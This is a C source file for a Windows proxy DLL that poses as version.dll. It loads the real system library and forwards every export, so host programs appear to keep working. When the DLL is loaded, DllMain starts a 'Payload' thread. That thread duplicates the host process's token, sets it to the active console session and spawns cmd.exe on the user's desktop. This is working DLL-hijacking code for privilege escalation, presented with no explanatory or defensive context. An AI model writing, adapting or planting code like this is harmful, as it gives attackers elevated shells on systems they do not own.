#include <windows.h>

static HMODULE hReal;

static void LoadReal(void) {
    wchar_t p[MAX_PATH];
    GetSystemDirectoryW(p, MAX_PATH);
    lstrcatW(p, L"\\version.dll");
    hReal = LoadLibraryW(p);
}

static DWORD WINAPI Payload(LPVOID x) {
    (void)x;
    HANDLE hToken, hDup;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return 1;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDup)) {
        CloseHandle(hToken);
        return 1;
    }
    DWORD sid = ((DWORD(WINAPI*)(void))GetProcAddress(GetModuleHandleW(L"kernel32.dll"),
                 "WTSGetActiveConsoleSessionId"))();
    SetTokenInformation(hDup, TokenSessionId, &sid, sizeof(sid));

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"winsta0\\default";
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[] = L"cmd.exe";
    CreateProcessAsUserW(hDup, L"C:\\Windows\\System32\\cmd.exe", cmd,
                         NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    CloseHandle(hDup);
    CloseHandle(hToken);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID x) {
    (void)h; (void)x;
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        LoadReal();
        CreateThread(NULL, 0, Payload, NULL, 0, NULL);
    } else if (r == DLL_PROCESS_DETACH && hReal) {
        FreeLibrary(hReal);
    }
    return TRUE;
}

#define FWD(ret, conv, name, args, call) \
    static ret (conv *o##name) args; \
    __declspec(dllexport) ret conv name args { \
        if (!o##name) o##name = (ret(conv*)args)GetProcAddress(hReal, #name); \
        return o##name ? o##name call : (ret)0; \
    }

FWD(BOOL,  WINAPI, GetFileVersionInfoA,       (LPCSTR a,DWORD b,DWORD c,LPVOID d),           (a,b,c,d))
FWD(BOOL,  WINAPI, GetFileVersionInfoW,       (LPCWSTR a,DWORD b,DWORD c,LPVOID d),          (a,b,c,d))
FWD(DWORD, WINAPI, GetFileVersionInfoSizeA,   (LPCSTR a,LPDWORD b),                           (a,b))
FWD(DWORD, WINAPI, GetFileVersionInfoSizeW,   (LPCWSTR a,LPDWORD b),                          (a,b))
FWD(BOOL,  WINAPI, GetFileVersionInfoExA,     (DWORD f,LPCSTR a,DWORD b,DWORD c,LPVOID d),   (f,a,b,c,d))
FWD(BOOL,  WINAPI, GetFileVersionInfoExW,     (DWORD f,LPCWSTR a,DWORD b,DWORD c,LPVOID d),  (f,a,b,c,d))
FWD(DWORD, WINAPI, GetFileVersionInfoSizeExA, (DWORD f,LPCSTR a,LPDWORD b),                   (f,a,b))
FWD(DWORD, WINAPI, GetFileVersionInfoSizeExW, (DWORD f,LPCWSTR a,LPDWORD b),                  (f,a,b))
FWD(BOOL,  WINAPI, VerQueryValueA,            (LPCVOID a,LPCSTR b,LPVOID* c,PUINT d),         (a,b,c,d))
FWD(BOOL,  WINAPI, VerQueryValueW,            (LPCVOID a,LPCWSTR b,LPVOID* c,PUINT d),        (a,b,c,d))
FWD(DWORD, WINAPI, VerFindFileA,              (DWORD a,LPSTR b,LPSTR c,LPSTR d,LPSTR e,PUINT f,LPSTR g,PUINT h), (a,b,c,d,e,f,g,h))
FWD(DWORD, WINAPI, VerFindFileW,              (DWORD a,LPWSTR b,LPWSTR c,LPWSTR d,LPWSTR e,PUINT f,LPWSTR g,PUINT h), (a,b,c,d,e,f,g,h))
FWD(DWORD, WINAPI, VerInstallFileA,           (DWORD a,LPSTR b,LPSTR c,LPSTR d,LPSTR e,LPSTR f,LPSTR g,PUINT h), (a,b,c,d,e,f,g,h))
FWD(DWORD, WINAPI, VerInstallFileW,           (DWORD a,LPWSTR b,LPWSTR c,LPWSTR d,LPWSTR e,LPWSTR f,LPWSTR g,PUINT h), (a,b,c,d,e,f,g,h))
FWD(DWORD, WINAPI, VerLanguageNameA,          (DWORD a,LPSTR b,DWORD c),                      (a,b,c))
FWD(DWORD, WINAPI, VerLanguageNameW,          (DWORD a,LPWSTR b,DWORD c),                     (a,b,c))
FWD(BOOL,  WINAPI, GetFileVersionInfoByHandle,(DWORD a,HANDLE b,DWORD c,DWORD d,LPVOID e),   (a,b,c,d,e))
